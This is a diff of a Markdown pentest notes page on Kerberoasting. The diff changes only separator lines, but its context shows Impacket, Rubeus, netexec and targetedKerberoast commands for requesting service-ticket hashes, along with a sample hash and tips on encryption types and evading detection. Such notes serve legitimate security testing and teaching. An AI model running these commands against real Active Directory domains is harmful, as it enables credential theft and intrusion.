@@ -18,7 +18,7 @@ linked:
 ---
 # Kerberoasting - Request TGS
 
-***
+---
 
 ## Impacket GetUserSPNs (Linux)
 
@@ -41,7 +41,7 @@ impacket-GetUserSPNs corp.local/auditor:'Pass!' -dc-ip 10.10.10.10 -request -out
 # $krb5tgs$23$*svc_sql$corp.local$MSSQLSvc/sqlsrv01.corp.local~1433*$abc123def...
 ```
 
-___
+---
 
 ## Rubeus kerberoast (Windows)
 
@@ -66,7 +66,7 @@ Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.hash /format:hashcat
 Rubeus.exe kerberoast /aes /outfile:aes_hashes.txt
 ```
 
-___
+---
 
 ## netexec kerberoasting
 
@@ -83,7 +83,7 @@ nxc ldap <DC> -u user -p pass --kerberoasting roast.hash
 # Output: hashcat-ready en file
 ```
 
-___
+---
 
 ## targetedKerberoast.py (Linux)
 
@@ -101,7 +101,7 @@ git clone https://github.com/ShutdownRepo/targetedKerberoast
 python3 targetedKerberoast/targetedKerberoast.py -d corp.local -u atacante -p 'Pass!'
 ```
 
-___
+---
 
 ## Encryption Type Selection
 
@@ -117,7 +117,7 @@ ___
 - Account UAC `UseDESKeyOnly` (legacy) o `msDS-SupportedEncryptionTypes` controla.
 - Atacante prefiere RC4 (faster crack) → `Rubeus /tgtdeleg` fuerza RC4 (loud).
 
-___
+---
 
 ## Targeted vs Bulk Roast
 
@@ -130,7 +130,7 @@ ___
 | OPSEC | Loud | Stealth |
 ^kerb-tgs-targetedvsbulk
 
-___
+---
 
 ## OPSEC Pre-Roast
 
@@ -144,7 +144,7 @@ ___
 | AES-only filter (`/aes`) si posible | Avoid RC4 etype anomaly | Modern. |
 ^kerb-tgs-opsec
 
-___
+---
 
 ## Common Errors
 
@@ -157,4 +157,4 @@ ___
 | `KRB_AP_ERR_MODIFIED` post-PtT | TGT corrupted | Re-request TGT. |
 ^kerb-tgs-errors
 
-***
+---
